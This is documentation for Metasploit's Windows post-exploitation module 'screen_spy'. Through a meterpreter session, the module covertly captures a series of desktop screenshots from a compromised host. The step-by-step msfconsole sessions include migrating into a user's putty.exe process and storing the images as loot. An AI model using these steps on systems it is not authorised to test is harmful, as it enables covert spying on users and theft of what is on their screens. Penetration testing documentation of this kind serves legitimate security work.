## Vulnerable Application

This module will incrementally take desktop screenshots from the
host. This allows for screen spying which can be useful to determine
if there is an active user on a machine, or to record the screen for
later data extraction.

Note: As of March, 2014, the `VIEW_CMD` option
has been removed in favor of the Boolean `VIEW_SCREENSHOTS` option,
which will control if (but not how) the collected screenshots will
be viewed from the Metasploit interface.

## Verification Steps

  1. Start msfconsole
  2. Get meterpreter session
  3. Do: `use post/windows/gather/screen_spy`
  4. Do: `set SESSION <session id>`
  5. Do: `run`

## Options

### RECORD
If set to true, record all screenshots to disk by saving them to loot.

### PID
PID to migrate into before taking the screenshots. If no PID is specified, default to current PID.

## Scenarios

### Windows 10 20H2 (No Database Connected But RECORD Flag Set)
```
msf6 exploit(multi/handler) > use post/windows/gather/screen_spy
msf6 post(windows/gather/screen_spy) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/screen_spy) > show options

Module options (post/windows/gather/screen_spy):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   COUNT             6                yes       Number of screenshots to collect
   DELAY             5                yes       Interval between screenshots in seconds
   PID                                no        PID to migrate into before taking the screenshots
   RECORD            true             yes       Record all screenshots to disk by saving them to loot
   SESSION           1                yes       The session to run this module on.
   VIEW_SCREENSHOTS  false            no        View screenshots automatically

msf6 post(windows/gather/screen_spy) > set SESSION 2
SESSION => 2
msf6 post(windows/gather/screen_spy) > run

[*] Capturing 6 screenshots with a delay of 5 seconds
[-] RECORD flag specified however the database is not connected, so no loot can be stored!
[*] Post module execution completed
```

### Windows 10 20H2 (No Database Connected, RECORD flag not set)
```
msf6 exploit(multi/handler) > use post/windows/gather/screen_spy
msf6 post(windows/gather/screen_spy) > set SESSION 2
SESSION => 2
msf6 post(windows/gather/screen_spy) > set RECORD false
RECORD => false
msf6 post(windows/gather/screen_spy) > set VIEW_SCREENSHOTS true
VIEW_SCREENSHOTS => true
msf6 post(windows/gather/screen_spy) > show options

Module options (post/windows/gather/screen_spy):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   COUNT             6                yes       Number of screenshots to collect
   DELAY             5                yes       Interval between screenshots in seconds
   PID                                no        PID to migrate into before taking the screenshots
   RECORD            false            yes       Record all screenshots to disk by saving them to loot
   SESSION           2                yes       The session to run this module on.
   VIEW_SCREENSHOTS  true             no        View screenshots automatically

msf6 post(windows/gather/screen_spy) > run

[*] Capturing 6 screenshots with a delay of 5 seconds
[*] Screen Spying Complete
[*] Post module execution completed
msf6 post(windows/gather/screen_spy) >
```

### Windows 10 20H2 (No Database Connected, RECORD flag not set, PID set to Process to Migrate To)
```
msf6 exploit(multi/handler) > use post/windows/gather/screen_spy
msf6 post(windows/gather/screen_spy) > set SESSION 2
SESSION => 2
msf6 post(windows/gather/screen_spy) > set RECORD false
RECORD => false
msf6 post(windows/gather/screen_spy) > set VIEW_SCREENSHOTS true
VIEW_SCREENSHOTS => true

msf6 post(windows/gather/screen_spy) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > ps -aux

Process List
============

 PID    PPID   Name                   Arch  Session  User                  Path
 ---    ----   ----                   ----  -------  ----                  ----
.....
 8236   1288   taskhostw.exe
 8296   760    svchost.exe
 8424   888    RuntimeBroker.exe      x64   2        DESKTOP-KUO5CML\test  C:\Windows\System32\RuntimeBroker.exe
 8572   3340   MeSuAx.exe
 8636   760    svchost.exe
 8664   8036   putty.exe              x64   2        DESKTOP-KUO5CML\test  C:\Program Files\PuTTY\putty.exe
.....

meterpreter > background
[*] Backgrounding session 2...
msf6 post(windows/gather/screen_spy) > set PID 8664
PID => 8664
msf6 post(windows/gather/screen_spy) > run

[+] Migration successful
[*] Capturing 6 screenshots with a delay of 5 seconds
[*] Screen Spying Complete
[*] Post module execution completed
msf6 post(windows/gather/screen_spy) >
```

### Windows 10 20H2 (Database Connected, RECORD flag set)
```
msf6 > use post/windows/gather/screen_spy
msf6 post(windows/gather/screen_spy) > db_status
[*] Connected to msf. Connection type: postgresql.
msf6 post(windows/gather/screen_spy) > set SESSION 2
SESSION => 2
msf6 post(windows/gather/screen_spy) > show options

Module options (post/windows/gather/screen_spy):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   COUNT             6                yes       Number of screenshots to collect
   DELAY             5                yes       Interval between screenshots in seconds
   PID                                no        PID to migrate into before taking the screenshots
   RECORD            true             yes       Record all screenshots to disk by saving them to loot
   SESSION           2                yes       The session to run this module on.
   VIEW_SCREENSHOTS  false            no        View screenshots automatically

msf6 post(windows/gather/screen_spy) > run

[*] Capturing 6 screenshots with a delay of 5 seconds
[*] Screen Spying Complete
[*] run loot -t screenspy.screenshot to see file locations of your newly acquired loot
[*] Post module execution completed
msf6 post(windows/gather/screen_spy) > loot

Loot
====

host            service  type                 name              content    info        path
----            -------  ----                 ----              -------    ----        ----
172.25.128.214           screenspy.screensho  screenshot.0.jpg  image/jpg  Screenshot  /home/gwillcox/.msf4/loot/20210412135019_d
                         t                                                             efault_172.25.128.214_screenspy.screen_098
                                                                                       612.jpg
172.25.128.214           screenspy.screensho  screenshot.1.jpg  image/jpg  Screenshot  /home/gwillcox/.msf4/loot/20210412135024_d
                         t                                                             efault_172.25.128.214_screenspy.screen_176
                                                                                       753.jpg
172.25.128.214           screenspy.screensho  screenshot.2.jpg  image/jpg  Screenshot  /home/gwillcox/.msf4/loot/20210412135029_d
                         t                                                             efault_172.25.128.214_screenspy.screen_057
                                                                                       554.jpg
172.25.128.214           screenspy.screensho  screenshot.3.jpg  image/jpg  Screenshot  /home/gwillcox/.msf4/loot/20210412135034_d
                         t                                                             efault_172.25.128.214_screenspy.screen_187
                                                                                       603.jpg
172.25.128.214           screenspy.screensho  screenshot.4.jpg  image/jpg  Screenshot  /home/gwillcox/.msf4/loot/20210412135039_d
                         t                                                             efault_172.25.128.214_screenspy.screen_397
                                                                                       543.jpg
172.25.128.214           screenspy.screensho  screenshot.5.jpg  image/jpg  Screenshot  /home/gwillcox/.msf4/loot/20210412135044_d
                         t                                                             efault_172.25.128.214_screenspy.screen_498
                                                                                       562.jpg

msf6 post(windows/gather/screen_spy) >
```
